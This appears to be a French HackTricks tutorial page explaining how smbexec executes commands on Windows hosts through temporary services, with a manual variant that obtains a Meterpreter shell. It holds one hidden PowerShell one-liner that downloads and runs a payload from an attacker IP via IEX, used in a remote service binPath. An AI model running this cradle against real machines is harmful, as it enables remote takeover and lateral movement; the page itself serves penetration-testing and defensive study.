# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Comment ça fonctionne

**Smbexec fonctionne comme Psexec.** Dans cet exemple, **au lieu** de pointer le "_binpath_" vers un exécutable malveillant à l'intérieur de la victime, nous allons **le diriger** vers **cmd.exe ou powershell.exe** et l'un d'eux téléchargera et exécutera le backdoor.

## **SMBExec**

Voyons ce qui se passe lorsque smbexec est exécuté en regardant du côté de l'attaquant et de la cible :

![](../../.gitbook/assets/smbexec\_prompt.png)

Nous savons donc qu'il crée un service "BTOBTO". Mais ce service n'est pas présent sur la machine cible lorsque nous faisons une `sc query`. Les journaux système révèlent un indice de ce qui s'est passé :

![](../../.gitbook/assets/smbexec\_service.png)

Le nom de fichier du service contient une chaîne de commande à exécuter (%COMSPEC% pointe vers le chemin absolu de cmd.exe). Il écho la commande à exécuter dans un fichier bat, redirige stdout et stderr vers un fichier Temp, puis exécute le fichier bat et le supprime. De retour sur Kali, le script Python récupère ensuite le fichier de sortie via SMB et affiche le contenu dans notre "pseudo-shell". Pour chaque commande que nous tapons dans notre "shell", un nouveau service est créé et le processus est répété. C'est pourquoi il n'a pas besoin de déposer un binaire, il exécute simplement chaque commande souhaitée en tant que nouveau service. Certainement plus discret, mais comme nous l'avons vu, un journal d'événements est créé pour chaque commande exécutée. Toujours une manière très ingénieuse d'obtenir un "shell" non interactif !

## SMBExec Manuel

**Ou exécuter des commandes via des services**

Comme l'a démontré smbexec, il est possible d'exécuter des commandes directement à partir des binPaths de services au lieu de nécessiter un binaire. Cela peut être une astuce utile à garder sous la main si vous avez besoin d'exécuter une commande arbitraire sur une machine Windows cible. Comme exemple rapide, obtenons un shell Meterpreter en utilisant un service à distance _sans_ binaire.

Nous utiliserons le module `web_delivery` de Metasploit et choisirons une cible PowerShell avec un payload Meterpreter inverse. Le listener est configuré et il nous indique la commande à exécuter sur la machine cible :
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
Depuis notre machine d'attaque Windows, nous créons un service à distance ("metpsh") et définissons le binPath pour exécuter cmd.exe avec notre charge utile :

![](../../.gitbook/assets/sc\_psh\_create.png)

Puis nous le démarrons :

![](../../.gitbook/assets/sc\_psh\_start.png)

Il y a une erreur car notre service ne répond pas, mais si nous regardons notre écouteur Metasploit, nous voyons que le rappel a été effectué et la charge utile exécutée.

Toutes les informations ont été extraites d'ici : [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
